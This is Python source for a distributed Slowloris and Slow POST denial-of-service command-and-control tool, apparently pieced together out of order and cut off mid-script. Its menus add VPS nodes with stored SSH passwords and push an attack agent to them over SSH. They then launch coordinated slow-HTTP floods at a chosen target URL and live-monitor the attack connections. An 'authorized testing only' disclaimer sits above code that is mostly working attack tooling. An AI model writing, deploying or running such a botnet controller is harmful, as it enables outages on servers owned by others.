def vps_management_menu(self):
        while self.running:
            self.clear_screen()
            self.print_banner()
            
            vps_list = self.db_manager.get_all_vps()
            
            print(f"{Colors.BOLD}VPS MANAGEMENT{Colors.RESET}")
            print("=" * 50)
            
            if vps_list:
                print(f"\n{'ID':<4} {'IP Address':<15} {'Username':<12} {'Status':<10} {'Agent':<8} {'Location':<15}")
                print("-" * 75)
                
                for vps in vps_list:
                    status_color = Colors.GREEN if vps[5] == 'online' else Colors.RED
                    agent_status = "YES" if len(vps) > 10 and vps[10] else "NO"
                    agent_color = Colors.GREEN if agent_status == "YES" else Colors.RED
                    location = (vps[8] or 'Unknown')[:14]
                    
                    print(f"{vps[0]:<4} {vps[1]:<15} {vps[2]:<12} {status_color}{vps[5]:<10}{Colors.RESET} {agent_color}{agent_status:<8}{Colors.RESET} {location:<15}")
            else:
                print(f"\n{Colors.YELLOW}No VPS nodes configured{Colors.RESET}")
            
            menu = f"""
{Colors.BOLD}VPS OPERATIONS:{Colors.RESET}
{Colors.GREEN}[1]{Colors.RESET} Add VPS Node
{Colors.GREEN}[2]{Colors.RESET} Test All Connections
{Colors.GREEN}[3]{Colors.RESET} Deploy Fixed Agents
{Colors.GREEN}[4]{Colors.RESET} Remove VPS Node
{Colors.GREEN}[5]{Colors.RESET} Test Single VPS
{Colors.GREEN}[0]{Colors.RESET} Back to Main Menu

{Colors.YELLOW}Select option (0-5): {Colors.RESET}"""
            
            print(menu)
            choice = input().strip()
            
            if choice == '1':
                self.add_vps()
            elif choice == '2':
                self.test_all_connections()
            elif choice == '3':
                self.deploy_all_agents()
            elif choice == '4':
                self.remove_vps()
            elif choice == '5':
                self.test_single_vps()
            elif choice == '0':
                break
    
    def add_vps(self):
        print(f"\n{Colors.BOLD}ADD NEW VPS NODE{Colors.RESET}")
        print("-" * 25)
        
        try:
            ip = self.input_with_prompt("IP Address: ")
            if not ip:
                return
            
            username = self.input_with_prompt("SSH Username: ")
            if not username:
                return
            
            password = self.input_with_prompt("SSH Password: ")
            if not password:
                return
            
            port = self.input_with_prompt("SSH Port (default 22): ", False) or "22"
            try:
                port = int(port)
            except ValueError:
                print(f"{Colors.RED}Invalid port number{Colors.RESET}")
                input("Press Enter to continue...")
                return
            
            location = self.input_with_prompt("Location (optional): ", False) or "Unknown"
            
            encrypted_password = self.security_manager.encrypt_password(password)
            
            vps_id = self.db_manager.add_vps(ip, username, encrypted_password, port, location)
            if vps_id:
                print(f"{Colors.GREEN}[SUCCESS] VPS added to database{Colors.RESET}")
                
                print(f"{Colors.YELLOW}[INFO] Testing connection...{Colors.RESET}")
                success, message = self.ssh_manager.connect_vps(ip, username, encrypted_password, port)
                
                status = 'online' if success else 'offline'
                self.db_manager.update_vps_status(ip, status)
                
                if success:
                    print(f"{Colors.GREEN}[SUCCESS] Connection test passed{Colors.RESET}")
                else:
                    print(f"{Colors.RED}[ERROR] Connection test failed: {message}{Colors.RESET}")
            else:
                print(f"{Colors.RED}[ERROR] VPS already exists or database error{Colors.RESET}")
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
        
        input("Press Enter to continue...")
    
    def test_all_connections(self):
        vps_list = self.db_manager.get_all_vps()
        
        if not vps_list:
            print(f"{Colors.YELLOW}[INFO] No VPS nodes to test{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.BOLD}TESTING ALL VPS CONNECTIONS{Colors.RESET}")
        print("-" * 40)
        
        online_count = 0
        for vps in vps_list:
            ip, username, encrypted_password, port = vps[1], vps[2], vps[3], vps[4]
            print(f"{Colors.CYAN}[TESTING] {ip}:{port}...{Colors.RESET} ", end="", flush=True)
            
            success, message = self.ssh_manager.connect_vps(ip, username, encrypted_password, port, timeout=10)
            
            if success:
                cmd_success, cmd_output = self.ssh_manager.execute_command(ip, "echo 'test' && python3 --version", timeout=10)
                if cmd_success and 'Python 3' in cmd_output:
                    print(f"{Colors.GREEN}ONLINE{Colors.RESET}")
                    self.db_manager.update_vps_status(ip, 'online')
                    online_count += 1
                else:
                    print(f"{Colors.YELLOW}CONNECTED (Python3 missing){Colors.RESET}")
                    self.db_manager.update_vps_status(ip, 'offline')
            else:
                print(f"{Colors.RED}OFFLINE - {message[:50]}{Colors.RESET}")
                self.db_manager.update_vps_status(ip, 'offline')
        
        print(f"\n{Colors.BOLD}Summary: {online_count}/{len(vps_list)} VPS online{Colors.RESET}")
        input("\nPress Enter to continue...")
    
    def deploy_all_agents(self):
        vps_list = self.db_manager.get_all_vps()
        online_vps = [vps for vps in vps_list if vps[5] == 'online']
        
        if not online_vps:
            print(f"{Colors.YELLOW}[INFO] No online VPS nodes available{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.BOLD}DEPLOYING FIXED AGENTS TO ALL ONLINE VPS{Colors.RESET}")
        print("-" * 50)
        
        successful_deployments = 0
        for vps in online_vps:
            ip = vps[1]
            print(f"{Colors.CYAN}[DEPLOYING] {ip}...{Colors.RESET} ", end="", flush=True)
            
            success, message = self.ssh_manager.deploy_agent(ip)
            
            if success:
                print(f"{Colors.GREEN}SUCCESS{Colors.RESET}")
                successful_deployments += 1
                self.db_manager.update_vps_status(ip, 'online', agent_deployed=True)
            else:
                print(f"{Colors.RED}FAILED - {message[:50]}{Colors.RESET}")
        
        print(f"\n{Colors.GREEN}[SUMMARY] {successful_deployments}/{len(online_vps)} fixed agents deployed{Colors.RESET}")
        input("\nPress Enter to continue...")
    
    def remove_vps(self):
        vps_list = self.db_manager.get_all_vps()
        
        if not vps_list:
            print(f"{Colors.YELLOW}[INFO] No VPS nodes to remove{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.BOLD}REMOVE VPS NODE{Colors.RESET}")
        print("-" * 20)
        
        for i, vps in enumerate(vps_list, 1):
            print(f"{i}. {vps[1]} ({vps[8] or 'Unknown'})")
        
        try:
            choice = self.input_with_prompt("Select VPS number to remove: ")
            if not choice or not choice.isdigit():
                return
            
            idx = int(choice) - 1
            if 0 <= idx < len(vps_list):
                vps = vps_list[idx]
                
                confirm = input(f"{Colors.YELLOW}Remove VPS {vps[1]}? (y/N): {Colors.RESET}").strip().lower()
                
                if confirm == 'y':
                    self.ssh_manager.disconnect_vps(vps[1])
                    
                    if self.db_manager.remove_vps(vps[1]):
                        print(f"{Colors.GREEN}[SUCCESS] VPS removed{Colors.RESET}")
                    else:
                        print(f"{Colors.RED}[ERROR] Failed to remove VPS{Colors.RESET}")
                else:
                    print(f"{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
            else:
                print(f"{Colors.RED}Invalid selection{Colors.RESET}")
                
        except (KeyboardInterrupt, ValueError):
            print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
        
        input("Press Enter to continue...")
    
    def test_single_vps(self):
        vps_list = self.db_manager.get_all_vps()
        
        if not vps_list:
            print(f"{Colors.YELLOW}[INFO] No VPS nodes available{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.BOLD}TEST SINGLE VPS{Colors.RESET}")
        print("-" * 20)
        
        for i, vps in enumerate(vps_list, 1):
            print(f"{i}. {vps[1]} ({vps[2]}@{vps[1]}:{vps[4]})")
        
        try:
            choice = self.input_with_prompt("Select VPS number: ")
            if not choice or not choice.isdigit():
                return
            
            idx = int(choice) - 1
            if 0 <= idx < len(vps_list):
                vps = vps_list[idx]
                ip, username, encrypted_password, port = vps[1], vps[2], vps[3], vps[4]
                
                print(f"{Colors.CYAN}[TESTING] {ip}...{Colors.RESET}")
                success, message = self.ssh_manager.connect_vps(ip, username, encrypted_password, port)
                
                if success:
                    print(f"{Colors.GREEN}[SUCCESS] Connection established{Colors.RESET}")
                    
                    test_commands = [
                        ("Basic test", "whoami && pwd"),
                        ("Python3 check", "python3 --version"),
                        ("Agent check", "ls -la /tmp/slowhttp_c2/ || echo 'Agent not found'")
                    ]
                    
                    for test_name, cmd in test_commands:
                        print(f"{Colors.CYAN}[TESTING] {test_name}...{Colors.RESET}")
                        cmd_success, output = self.ssh_manager.execute_command(ip, cmd)
                        if cmd_success:
                            print(f"{Colors.GREEN}  ✓ {output[:80]}{Colors.RESET}")
                        else:
                            print(f"{Colors.RED}  ✗ {output[:80]}{Colors.RESET}")
                    
                    self.db_manager.update_vps_status(ip, 'online')
                else:
                    print(f"{Colors.RED}[ERROR] Connection failed: {message}{Colors.RESET}")
                    self.db_manager.update_vps_status(ip, 'offline')
            else:
                print(f"{Colors.RED}Invalid selection{Colors.RESET}")
                
        except (KeyboardInterrupt, ValueError):
            print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
        
        input("Press Enter to continue...")
    
    def launch_attack_menu(self):
        self.clear_screen()
        self.print_banner()
        
        vps_list = self.db_manager.get_all_vps()
        online_vps = [vps for vps in vps_list if vps[5] == 'online']
        
        if not online_vps:
            print(f"{Colors.RED}[ERROR] No online VPS nodes available{Colors.RESET}")
            print(f"{Colors.YELLOW}[INFO] Please add and test VPS nodes first{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"{Colors.BOLD}LAUNCH FIXED DISTRIBUTED ATTACK{Colors.RESET}")
        print("=" * 50)
        
        print(f"\n{Colors.GREEN}Available VPS Nodes: {len(online_vps)}{Colors.RESET}")
        for i, vps in enumerate(online_vps, 1):
            agent_status = "✓" if len(vps) > 10 and vps[10] else "✗"
            print(f"  {i}. {vps[1]} ({vps[8] or 'Unknown'}) [Agent: {agent_status}]")
        
        try:
            # Target configuration
            print(f"\n{Colors.BOLD}TARGET CONFIGURATION:{Colors.RESET}")
            target_url = self.input_with_prompt("Target URL (e.g., http://target.com): ")
            if not target_url:
                return
            
            if not target_url.startswith(('http://', 'https://')):
                target_url = 'http://' + target_url
            
            # Attack type
            print(f"\n{Colors.BOLD}ATTACK TYPE:{Colors.RESET}")
            print(f"{Colors.GREEN}[1]{Colors.RESET} Slowloris (Keep connections open)")
            print(f"{Colors.GREEN}[2]{Colors.RESET} Slow POST (R.U.D.Y - Large uploads)")
            
            attack_choice = self.input_with_prompt("Select attack type (1-2): ")
            attack_types = {'1': 'slowloris', '2': 'slow_post'}
            attack_type = attack_types.get(attack_choice)
            
            if not attack_type:
                print(f"{Colors.RED}Invalid attack type{Colors.RESET}")
                input("Press Enter to continue...")
                return
            
            # VPS selection
            print(f"\n{Colors.BOLD}VPS SELECTION:{Colors.RESET}")
            use_all = self.input_with_prompt("Use all VPS? (Y/n): ", False) or 'y'
            
            if use_all.lower() == 'y':
                selected_vps = [vps[1] for vps in online_vps]
            else:
                print("Select VPS numbers (comma-separated, e.g., 1,2,3):")
                selection = self.input_with_prompt("VPS selection: ")
                if not selection:
                    return
                
                try:
                    indices = [int(x.strip()) - 1 for x in selection.split(',')]
                    selected_vps = [online_vps[i][1] for i in indices if 0 <= i < len(online_vps)]
                except (ValueError, IndexError):
                    print(f"{Colors.RED}Invalid VPS selection{Colors.RESET}")
                    input("Press Enter to continue...")
                    return
            
            if not selected_vps:
                print(f"{Colors.RED}No VPS selected{Colors.RESET}")
                input("Press Enter to continue...")
                return
            
            # Attack parameters
            print(f"\n{Colors.BOLD}ATTACK PARAMETERS:{Colors.RESET}")
            
            connections_str = self.input_with_prompt("Connections per VPS (default 100): ", False) or "100"
            try:
                connections = max(1, int(connections_str))
            except ValueError:
                connections = 100
            
            delay_str = self.input_with_prompt("Delay between packets (default 15): ", False) or "15"
            try:
                delay = max(0, int(delay_str))
            except ValueError:
                delay = 15
            
            duration_str = self.input_with_prompt("Attack duration in seconds (0 for unlimited): ", False) or "0"
            try:
                duration = max(0, int(duration_str))
            except ValueError:
                duration = 0
            
            # Attack summary
            print(f"\n{Colors.BOLD}FIXED ATTACK SUMMARY:{Colors.RESET}")
            print(f"Target: {Colors.YELLOW}{target_url}{Colors.RESET}")
            attack_name = "Slowloris (Fixed)" if attack_type == "slowloris" else "Slow POST (Fixed)"
            print(f"Attack Type: {Colors.YELLOW}{attack_name}{Colors.RESET}")
            print(f"VPS Nodes: {Colors.YELLOW}{len(selected_vps)}{Colors.RESET}")
            print(f"Connections per VPS: {Colors.YELLOW}{connections:,}{Colors.RESET}")
            print(f"Total Connections: {Colors.YELLOW}{len(selected_vps) * connections:,}{Colors.RESET}")
            print(f"Packet Delay: {Colors.YELLOW}{delay}s{Colors.RESET}")
            print(f"Duration: {Colors.YELLOW}{'Unlimited' if duration == 0 else f'{duration}s'}{Colors.RESET}")
            
            # Confirmation
            confirm = input(f"\n{Colors.RED}Launch FIXED attack? (y/N): {Colors.RESET}").strip().lower()
            
            if confirm != 'y':
                print(f"{Colors.YELLOW}[CANCELLED] Attack cancelled{Colors.RESET}")
                input("Press Enter to continue...")
                return
            
            # Create attack session
            session_name = f"Fixed_{attack_type}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            target_host = target_url.replace('http://', '').replace('https://', '').split('/')[0].split(':')[0]
            
            parameters = {
                'connections': connections,
                'delay': delay,
                'duration': duration
            }
            
            session_id = self.db_manager.create_attack_session(
                session_name, target_url, target_host, attack_type, selected_vps, parameters
            )
            
            # Launch the FIXED attack
            success = self.attack_manager.launch_attack(
                session_id, target_url, attack_type, selected_vps, parameters
            )
            
            if success:
                print(f"\n{Colors.GREEN}[SUCCESS] FIXED ATTACK LAUNCHED!{Colors.RESET}")
                print(f"{Colors.CYAN}[INFO] Session ID: {session_id}{Colors.RESET}")
                
                input(f"\n{Colors.YELLOW}Press Enter to start monitoring...{Colors.RESET}")
                self.monitor_attack(session_id)
            else:
                print(f"{Colors.RED}[ERROR] Failed to launch FIXED attack{Colors.RESET}")
                input("Press Enter to continue...")
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[CANCELLED] Operation cancelled{Colors.RESET}")
            input("Press Enter to continue...")
        except Exception as e:
            print(f"{Colors.RED}[ERROR] {str(e)}{Colors.RESET}")
            input("Press Enter to continue...")
    
    def monitor_attack(self, session_id=None):
        if session_id is None:
            if not self.attack_manager.active_attacks:
                print(f"{Colors.YELLOW}[INFO] No active attacks to monitor{Colors.RESET}")
                input("Press Enter to continue...")
                return
            
            print(f"\n{Colors.BOLD}ACTIVE ATTACKS:{Colors.RESET}")
            for sid, attack_info in self.attack_manager.active_attacks.items():
                attack_name = "Slowloris (Fixed)" if attack_info['attack_type'] == "slowloris" else "Slow POST (Fixed)"
                print(f"Session {sid}: {attack_info['target_host']} ({attack_name})")
            
            try:
                session_input = self.input_with_prompt("Enter session ID to monitor: ")
                if not session_input or not session_input.isdigit():
                    return
                session_id = int(session_input)
            except (ValueError, KeyboardInterrupt):
                return
        
        if session_id not in self.attack_manager.active_attacks:
            print(f"{Colors.RED}[ERROR] Session not found{Colors.RESET}")
            input("Press Enter to continue...")
            return
        
        print(f"\n{Colors.GREEN}[MONITORING] Starting real-time monitoring...{Colors.RESET}")
        print(f"{Colors.YELLOW}[CONTROLS] Press Ctrl+C to stop monitoring{Colors.RESET}")
        time.sleep(2)
        
        try:
            while session_id in self.attack_manager.active_attacks:
                status_data = self.attack_manager.get_attack_status(session_id)
                attack_info = self.attack_manager.active_attacks[session_id]
                
                self.clear_screen()
                
                print(f"{Colors.BOLD}{'='*80}{Colors.RESET}")
                print(f"{Colors.BOLD}{Colors.RED}           FIXED DISTRIBUTED SLOW HTTP ATTACK - LIVE MONITORING{Colors.RESET}")
                print(f"{Colors.BOLD}{'='*80}{Colors.RESET}")
                
                attack_name = "SLOWLORIS (FIXED)" if attack_info.get('attack_type') == 'slowloris' else "SLOW POST (FIXED)"
                print(f"\n{Colors.YELLOW}[SESSION] {session_id} - {attack_name}{Colors.RESET}")
                print(f"{Colors.CYAN}[TARGET]  {attack_info.get('target_host', 'Unknown')}{Colors.RESET}")
                
                if attack_info.get('start_time'):
                    uptime = datetime.now() - attack_info['start_time']
                    print(f"{Colors.GREEN}[UPTIME]  {str(uptime).split('.')[0]}{Colors.RESET}")
                
                params = attack_info.get('parameters', {})
                print(f"{Colors.PURPLE}[PARAMS]  Connections: {params.get('connections', 'N/A'):,} | Delay: {params.get('delay', 'N/A')}s{Colors.RESET}")
                
                print(f"\n{Colors.BOLD}VPS STATUS:{Colors.RESET}")
                print(f"{'IP Address':<15} {'Status':<12} {'Processes':<10} {'Connections':<15} {'Last Check'}")
                print("-" * 70)
                
                total_processes = 0
                active_vps = 0
                
                for vps_ip, data in status_data.items():
                    processes = data.get('active_processes', 0)
                    status = "ATTACKING" if processes > 0 else "IDLE"
                    color = Colors.GREEN if processes > 0 else Colors.RED
                    conn_info = data.get('connections_info', '')
                    
                    total_processes += processes
                    if processes > 0:
                        active_vps += 1
                    
                    print(f"{vps_ip:<15} {color}{status:<12}{Colors.RESET} {processes:<10} {conn_info:<15} {datetime.now().strftime('%H:%M:%S')}")
                
                print(f"\n{Colors.BOLD}FIXED ATTACK STATISTICS:{Colors.RESET}")
                print(f"{Colors.YELLOW}Active VPS Nodes: {active_vps}/{len(status_data)}{Colors.RESET}")
                print(f"{Colors.YELLOW}Total Attack Processes: {total_processes}{Colors.RESET}")
                
                est_connections = total_processes * params.get('connections', 100)
                print(f"{Colors.RED}Estimated Active Connections: {est_connections:,}{Colors.RESET}")
                
                print(f"\n{Colors.PURPLE}[CONTROLS] Press Ctrl+C to stop monitoring{Colors.RESET}")
                
                time.sleep(5)
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[INFO] Monitoring stopped{Colors.RESET}")
            
            try:
                stop_attack = input(f"{Colors.RED}Stop the FIXED attack? (y/N): {Colors.RESET}").strip().lower()
                if stop_attack == 'y':
                    self.attack_manager.stop_attack(session_id)
            except KeyboardInterrupt:
                pass
        
        input("\nPress Enter to continue...")
    
    def attack_history_menu(self):
        self.clear_screen()
        self.print_banner()
        
        sessions = self.db_manager.get_attack_sessions()
        
        print(f"{Colors.BOLD}ATTACK HISTORY{Colors.RESET}")
        print("=" * 30)
        
        if not sessions:
            print(f"\n{Colors.YELLOW}No attack history found{Colors.RESET}")
        else:
            print(f"\n{'ID':<4} {'Session Name':<25} {'Target':<20} {'Type':<15} {'Status':<10} {'Start Time'}")
            print("-" * 100)
            
            for session in sessions:
                start_time = session[6][:19] if session[6] else 'N/A'
                status_color = Colors.GREEN if session[8] == 'completed' else Colors.YELLOW if session[8] == 'running' else Colors.RED
                attack_type = "Slowloris (Fixed)" if session[4] == 'slowloris' else "Slow POST (Fixed)"
                
                print(f"{session[0]:<4} {session[1][:24]:<25} {session[3][:19]:<20} {attack_type:<15} {status_color}{session[8]:<10}{Colors.RESET} {start_time}")
        
        input("\nPress Enter to continue...")
    
    def system_status_menu(self):
        self.clear_screen()
        self.print_banner()
        
        print(f"{Colors.BOLD}SYSTEM STATUS{Colors.RESET}")
        print("=" * 20)
        
        # VPS Statistics
        vps_list = self.db_manager.get_all_vps()
        online_count = sum(1 for vps in vps_list if vps[5] == 'online')
        offline_count = len(vps_list) - online_count
        agents_deployed = sum(1 for vps in vps_list if len(vps) > 10 and vps[10])
        
        print(f"\n{Colors.BOLD}VPS NODES:{Colors.RESET}")
        print(f"Total VPS: {Colors.CYAN}{len(vps_list)}{Colors.RESET}")
        print(f"Online: {Colors.GREEN}{online_count}{Colors.RESET}")
        print(f"Offline: {Colors.RED}{offline_count}{Colors.RESET}")
        print(f"Fixed Agents Deployed: {Colors.YELLOW}{agents_deployed}{Colors.RESET}")
        
        # Attack Statistics
        sessions = self.db_manager.get_attack_sessions()
        active_attacks = len(self.attack_manager.active_attacks)
        
        print(f"\n{Colors.BOLD}ATTACKS:{Colors.RESET}")
        print(f"Total Sessions: {Colors.CYAN}{len(sessions)}{Colors.RESET}")
        print(f"Active Fixed Attacks: {Colors.RED}{active_attacks}{Colors.RESET}")
        
        # SSH Connections
        ssh_connections = len(self.ssh_manager.connections)
        
        print(f"\n{Colors.BOLD}SSH CONNECTIONS:{Colors.RESET}")
        print(f"Active SSH: {Colors.GREEN}{ssh_connections}{Colors.RESET}")
        print(f"Cached Credentials: {Colors.CYAN}{len(self.ssh_manager.connection_cache)}{Colors.RESET}")
        
        # System Information
        print(f"\n{Colors.BOLD}SYSTEM INFO:{Colors.RESET}")
        print(f"Database: {Colors.CYAN}{os.path.exists(self.db_manager.db_file)}{Colors.RESET}")
        print(f"Security Key: {Colors.CYAN}{os.path.exists('key.key')}{Colors.RESET}")
        print(f"Version: {Colors.GREEN}Complete Fixed Edition v4.0{Colors.RESET}")
        
        input("\nPress Enter to continue...")#!/usr/bin/env python3
"""
Distributed Slow HTTP Testing C2 - Complete Fixed Version
Author: Security Research Tool
Purpose: Educational and Authorized Penetration Testing Only

⚠️ WARNING: FOR EDUCATIONAL AND AUTHORIZED TESTING ONLY! ⚠️
Unauthorized use against systems you don't own is ILLEGAL!
"""

import sqlite3
import paramiko
import threading
import json
import time
import os
import sys
import signal
import socket
import random
import string
import subprocess
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor
import base64
from cryptography.fernet import Fernet
import colorama
from colorama import Fore, Back, Style
from urllib.parse import urlparse

# Initialize colorama for cross-platform colored output
colorama.init(autoreset=True)

class Colors:
    RED = Fore.RED
    GREEN = Fore.GREEN
    YELLOW = Fore.YELLOW
    BLUE = Fore.BLUE
    PURPLE = Fore.MAGENTA
    CYAN = Fore.CYAN
    WHITE = Fore.WHITE
    BOLD = Style.BRIGHT
    DIM = Style.DIM
    RESET = Style.RESET_ALL

class SecurityManager:
    def __init__(self):
        key_file = 'key.key'
        if os.path.exists(key_file):
            with open(key_file, 'rb') as f:
                self.key = f.read()
        else:
            self.key = Fernet.generate_key()
            with open(key_file, 'wb') as f:
                f.write(self.key)
            os.chmod(key_file, 0o600) 
        self.cipher = Fernet(self.key)
    
    def encrypt_password(self, password):
        return base64.b64encode(self.cipher.encrypt(password.encode())).decode()
    
    def decrypt_password(self, encrypted_password):
        try:
            return self.cipher.decrypt(base64.b64decode(encrypted_password.encode())).decode()
        except Exception:
            return encrypted_password

class DatabaseManager:
    def __init__(self, db_file='c2_database.db'):
        self.db_file = db_file
        self.init_database()
    
    def init_database(self):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        # VPS nodes table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS vps_nodes (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                ip_address TEXT NOT NULL UNIQUE,
                username TEXT NOT NULL,
                password TEXT NOT NULL,
                ssh_port INTEGER DEFAULT 22,
                status TEXT DEFAULT 'offline',
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                last_seen TIMESTAMP,
                location TEXT,
                capabilities TEXT,
                agent_deployed BOOLEAN DEFAULT 0
            )
        ''')
        
        # Attack sessions table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS attack_sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_name TEXT NOT NULL,
                target_url TEXT NOT NULL,
                target_host TEXT,
                attack_type TEXT NOT NULL,
                vps_nodes TEXT,
                start_time TIMESTAMP,
                end_time TIMESTAMP,
                status TEXT DEFAULT 'pending',
                parameters TEXT,
                results TEXT
            )
        ''')
        
        # Attack results table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS attack_results (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id INTEGER,
                vps_ip TEXT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                connections_active INTEGER DEFAULT 0,
                packets_sent INTEGER DEFAULT 0,
                status TEXT,
                FOREIGN KEY (session_id) REFERENCES attack_sessions (id)
            )
        ''')
        
        conn.commit()
        conn.close()
        
        # Set secure permissions
        os.chmod(self.db_file, 0o600)
    
    def add_vps(self, ip, username, encrypted_password, port=22, location="Unknown"):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        try:
            cursor.execute('''
                INSERT INTO vps_nodes (ip_address, username, password, ssh_port, location)
                VALUES (?, ?, ?, ?, ?)
            ''', (ip, username, encrypted_password, port, location))
            conn.commit()
            return cursor.lastrowid
        except sqlite3.IntegrityError:
            return None
        finally:
            conn.close()
    
    def get_all_vps(self):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM vps_nodes ORDER BY id')
        vps_list = cursor.fetchall()
        conn.close()
        return vps_list
    
    def update_vps_status(self, ip, status, agent_deployed=None):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        if agent_deployed is not None:
            cursor.execute('''
                UPDATE vps_nodes SET status = ?, last_seen = ?, agent_deployed = ? WHERE ip_address = ?
            ''', (status, datetime.now().isoformat(), agent_deployed, ip))
        else:
            cursor.execute('''
                UPDATE vps_nodes SET status = ?, last_seen = ? WHERE ip_address = ?
            ''', (status, datetime.now().isoformat(), ip))
        
        conn.commit()
        conn.close()
    
    def remove_vps(self, ip):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute('DELETE FROM vps_nodes WHERE ip_address = ?', (ip,))
        affected_rows = cursor.rowcount
        conn.commit()
        conn.close()
        return affected_rows > 0
    
    def create_attack_session(self, session_name, target_url, target_host, attack_type, vps_list, parameters):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO attack_sessions (session_name, target_url, target_host, attack_type, vps_nodes, parameters, start_time, status)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (session_name, target_url, target_host, attack_type, json.dumps(vps_list), json.dumps(parameters), datetime.now().isoformat(), 'running'))
        
        session_id = cursor.lastrowid
        conn.commit()
        conn.close()
        return session_id
    
    def get_attack_sessions(self, limit=20):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        cursor.execute('SELECT * FROM attack_sessions ORDER BY start_time DESC LIMIT ?', (limit,))
        sessions = cursor.fetchall()
        conn.close()
        return sessions

class SSHManager:
    def __init__(self, security_manager):
        self.connections = {}
        self.security_manager = security_manager
        self.connection_cache = {}
        self.lock = threading.Lock()
    
    def connect_vps(self, ip, username, encrypted_password, port=22, timeout=15):
        try:
            password = self.security_manager.decrypt_password(encrypted_password)
            
            # Cache credentials for auto-reconnect
            self.connection_cache[ip] = {
                'username': username,
                'encrypted_password': encrypted_password,
                'port': port
            }
            
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            ssh.connect(
                hostname=ip,
                username=username,
                password=password,
                port=port,
                timeout=timeout,
                look_for_keys=False,
                allow_agent=False
            )
            
            with self.lock:
                if ip in self.connections:
                    try:
                        self.connections[ip].close()
                    except:
                        pass
                self.connections[ip] = ssh
            
            return True, "Connected successfully"
            
        except Exception as e:
            return False, str(e)
    
    def reconnect_vps(self, ip):
        """Attempt to reconnect to VPS using cached credentials"""
        if ip not in self.connection_cache:
            return False, "No cached credentials for this VPS"
        
        cached = self.connection_cache[ip]
        return self.connect_vps(
            ip, 
            cached['username'], 
            cached['encrypted_password'], 
            cached['port']
        )
    
    def disconnect_vps(self, ip):
        with self.lock:
            if ip in self.connections:
                try:
                    self.connections[ip].close()
                    del self.connections[ip]
                    return True
                except Exception:
                    pass
        return False
    
    def execute_command(self, ip, command, timeout=60, auto_reconnect=True):
        """Execute command with auto-reconnect capability"""
        
        # Check if connection exists
        if ip not in self.connections:
            if auto_reconnect:
                print(f"[SSH] No connection to {ip}, attempting reconnect...")
                success, message = self.reconnect_vps(ip)
                if not success:
                    return False, f"Reconnection failed: {message}"
            else:
                return False, "No connection to VPS"
        
        try:
            with self.lock:
                ssh_client = self.connections[ip]
            
            stdin, stdout, stderr = ssh_client.exec_command(command, timeout=timeout)
            
            output = stdout.read().decode('utf-8', errors='ignore').strip()
            error = stderr.read().decode('utf-8', errors='ignore').strip()
            exit_status = stdout.channel.recv_exit_status()
            
            if exit_status == 0:
                return True, output if output else "Command executed successfully"
            else:
                return False, error if error else f"Command failed with exit status {exit_status}"
                
        except Exception as e:
            # Connection might be broken, remove it
            with self.lock:
                if ip in self.connections:
                    try:
                        self.connections[ip].close()
                    except:
                        pass
                    del self.connections[ip]
            
            # Try to reconnect and execute again if auto_reconnect is enabled
            if auto_reconnect:
                print(f"[SSH] Command failed on {ip}, attempting reconnect and retry...")
                success, message = self.reconnect_vps(ip)
                if success:
                    return self.execute_command(ip, command, timeout, auto_reconnect=False)
                else:
                    return False, f"Reconnection failed: {message}"
            
            return False, str(e)
    
    def deploy_agent(self, ip):
        """Deploy the FIXED slow HTTP attack agent to VPS"""
        
        # Complete FIXED agent script with all improvements
        agent_script = '''#!/usr/bin/env python3
"""
Fixed Slow HTTP Attack Agent
Purpose: Educational and Authorized Penetration Testing Only
"""

import socket
import threading
import time
import sys
import random
import string
import signal
import argparse
import ssl
from urllib.parse import urlparse

class SlowHTTPAttack:
    def __init__(self, host, port=80, use_ssl=False):
        self.host = host
        self.port = port
        self.use_ssl = use_ssl
        self.conns = []
        self.running = False
        self.stats = {'sent': 0, 'errors': 0, 'active': 0, 'bytes_sent': 0}
        self.lock = threading.Lock()
    
    def create_socket(self):
        """Create and connect socket with proper SSL handling"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(15)
            
            if self.use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=self.host)
            
            sock.connect((self.host, self.port))
            return sock
        except Exception:
            with self.lock:
